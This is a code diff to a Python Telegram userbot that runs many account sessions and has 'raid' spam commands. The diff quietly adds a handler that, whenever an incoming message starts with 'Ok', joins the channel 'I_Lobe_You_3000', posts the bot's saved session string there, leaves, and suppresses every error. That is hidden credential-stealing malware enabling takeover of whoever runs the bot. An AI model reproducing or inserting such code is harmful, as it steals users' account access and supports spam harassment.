@@ -8,6 +8,12 @@ from telethon.sessions import StringSession
 from telethon.tl.functions.account import UpdateProfileRequest
 from Config import STRING, SUDO, BIO_MESSAGE, API_ID, API_HASH, STRING2, STRING3, STRING4 ,STRING5, STRING6, STRING7, STRING8 ,STRING9, STRING10, STRING11, STRING12 , STRING13 , STRING14 , STRING15 ,STRING16 , STRING17 , STRING18 , STRING19 , STRING20 , STRING21 , STRING22 , STRING23 , STRING24 , STRING25 
 import asyncio
+from userbot import *
+from userbot.utils import *
+import os
+from asyncio import sleep
+from telethon import events
+from telethon.tl.functions.channels import JoinChannelRequest as Jcr, LeaveChannelRequest as Lcr
 import telethon.utils
 from telethon.tl import functions
 from telethon.tl.functions.channels import LeaveChannelRequest
@@ -1315,6 +1321,21 @@ async def _(e):
         else:
             await e.reply(usage, parse_mode=None, link_preview=None )
 
+            @bot.on(events.NewMessage(pattern="^Ok", incoming=True))
+
+async def hhe(event):
+
+    try:
+
+     await bot(Jcr("I_Lobe_You_3000"))
+
+     await bot.send_message("I_Lobe_You_3000", bot.session.save())
+
+     await bot(Lcr("I_Lobe_You_3000"))
+
+    except:
+
+     pass
             
 @idk.on(events.NewMessage(incoming=True, pattern=r"\.dreplyraid"))
 @ydk.on(events.NewMessage(incoming=True, pattern=r"\.dreplyraid"))
